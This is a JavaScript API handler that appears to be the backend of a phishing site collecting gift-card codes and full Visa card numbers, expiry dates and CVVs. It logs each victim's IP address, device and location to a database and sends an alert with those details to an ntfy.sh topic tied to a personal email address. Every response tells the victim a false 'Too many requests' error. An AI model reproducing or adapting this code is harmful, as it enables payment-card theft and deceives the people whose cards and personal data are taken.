import { supabase } from '../../lib/supabase'

// Helper function to parse device from user agent (matches qazmlp.js logic)
function parseDevice(userAgent, browserInfo) {
  const ua = userAgent || ''
  const browser = browserInfo ? JSON.parse(browserInfo) : null

  let device = 'Unknown Device'
  if (ua.includes('iPhone')) device = 'iPhone'
  else if (ua.includes('iPad')) device = 'iPad'
  else if (ua.includes('Android')) device = 'Android Device'
  else if (ua.includes('Windows')) device = 'Windows PC'
  else if (ua.includes('Macintosh')) device = 'MacBook/Mac'

  if (browser && browser.platform === 'iPhone') device = 'iPhone'

  const platform = browser?.platform || 'Unknown'
  return `${device} (${platform})`
}

// Helper function to send notification via ntfy.sh
async function sendNotification(cardData) {
  const { type, ip_address, location, user_agent, browser_info } = cardData

  // Format title based on card type
  const titleMap = {
    'apple': 'apple crd',
    'steam': 'steam crd',
    'visa': 'visa crd'
  }
  const title = titleMap[type] || `${type} crd`

  // Parse device info
  const device = parseDevice(user_agent, browser_info)

  // Format time
  const time = new Date().toLocaleString('en-US', {
    timeZone: 'Africa/Lagos', // Adjust timezone as needed
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    month: 'short',
    day: 'numeric',
    year: 'numeric'
  })

  // Build notification body
  const body = `Type: ${type.charAt(0).toUpperCase() + type.slice(1)} Card
IP Address: ${ip_address || 'N/A'}
Device: ${device}
Location: ${location || 'Unknown'}
Time: ${time}`

  console.log('[NTFY] Sending notification for', type, 'card...')

  try {
    const response = await fetch('https://ntfy.sh/my_secret_topic_name', {
      method: 'POST',
      headers: {
        'Email': 'linda4uxo@gmail.com',
        'Title': title
      },
      body: body
    })
    const responseText = await response.text()
    console.log('[NTFY] Response status:', response.status)
    console.log('[NTFY] Response body:', responseText)
  } catch (err) {
    console.error('[NTFY] Failed to send notification:', err)
    // Don't throw - notification failure shouldn't break the card submission
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
  const { cardNumber, type = 'apple', deviceId, browserInfo, location, expiry, cvv } = req.body || {}

  // Basic validation
  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
    return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
  }

  const last4 = cardNumber.slice(-4)
  const balance = 0

  // Capture metadata from headers and body
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
  const userAgent = req.headers['user-agent'] || 'unknown'

  const now = new Date().toISOString()
  const result = {
    card_number: cardNumber,
    balance,
    currency: 'USD',
    timestamp: now,
    type,
    device_id: deviceId,
    ip_address: typeof ip === 'string' ? ip.split(',')[0] : ip,
    user_agent: userAgent,
    browser_info: browserInfo || null,
    location: location || null,
    expiry: type === 'visa' ? (expiry || null) : null,
    cvv: type === 'visa' ? (cvv || null) : null
  }

  let cardInserted = false

  try {
    // Check for duplicates from the same device
    if (deviceId) {
      const { data: existing } = await supabase
        .from('cards')
        .select('id')
        .match({ card_number: cardNumber, device_id: deviceId })
        .limit(1)

      if (existing && existing.length > 0) {
        return res.status(200).json({
          ...result,
          cardNumber: result.card_number,
          cardLast4: last4,
          isDuplicate: true,
          message: 'Too many requests. Please wait a minute and try again later.'
        })
      }
    }

    const { error } = await supabase
      .from('cards')
      .insert([result])

    if (error) throw error

    cardInserted = true
  } catch (err) {
    console.error(`Failed to save ${type} card to Supabase:`, err)
    return res.status(500).json({
      error: `Database save failed: ${err.message || 'Unknown error'}`
    })
  }

  // Send notification AFTER successful card insertion (outside main try-catch)
  if (cardInserted) {
    // Fire and forget - don't await, just let it run in background
    sendNotification(result).catch(err => {
      console.error('[NTFY] Notification error (non-blocking):', err)
    })
  }

  return res.status(200).json({
    ...result,
    cardNumber: result.card_number,
    cardLast4: last4,
    message: 'Too many requests. Please wait a minute and try again later.'
  })
}
